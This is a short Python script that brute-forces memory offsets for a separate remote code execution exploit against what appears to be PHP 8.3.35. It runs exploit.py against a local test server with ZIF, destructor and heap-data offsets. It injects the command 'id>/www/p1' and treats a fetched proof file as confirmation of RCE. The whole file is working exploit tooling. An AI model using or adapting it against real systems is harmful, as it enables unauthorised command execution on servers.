"""Try different htdata offsets for 8.3.35 to find the right one."""
import subprocess, sys, os, time

BASE = os.path.dirname(os.path.abspath(__file__))
EXPLOIT = os.path.join(BASE, "exploit.py")

# Try offsets around 0x690d8
offsets = [
    0x690d8,  # original
    0x690d8 + 0x10,
    0x690d8 + 0x20,
    0x690d8 + 0x30,
    0x690d8 - 0x10,
    0x690d8 - 0x20,
    0x690d8 + 0x100,
    0x690d8 - 0x100,
]

for off in offsets:
    args = [
        sys.executable, EXPLOIT,
        "-u", "http://127.0.0.1:18112/",
        "-c", "id>/www/p1",
        "--zif-offset", "0x3ac080",
        "--dtor-offset", "0x49ec50",
        "--htdata-offset", hex(off),
        "--profile", "bookworm",
        "--huge-mb", "256",
        "--retries", "2",
        "--fetch", "/p1",
        "--no-auto-offsets",
        "-q",
    ]
    t0 = time.time()
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=120)
        out = (r.stdout or "") + (r.stderr or "")
        ok = "PROOF:" in out and r.returncode == 0
        dt = time.time() - t0
        status = "[+] RCE" if ok else "[-]"
        # Get the last line
        last_line = out.strip().splitlines()[-1] if out.strip() else "no output"
        print(f"  0x{off:06x}: {status} ({dt:.1f}s) - {last_line[:80]}", flush=True)
        if ok:
            break
    except subprocess.TimeoutExpired:
        print(f"  0x{off:06x}: TIMEOUT", flush=True)
    time.sleep(0.5)

print("\n=== done ===", flush=True)
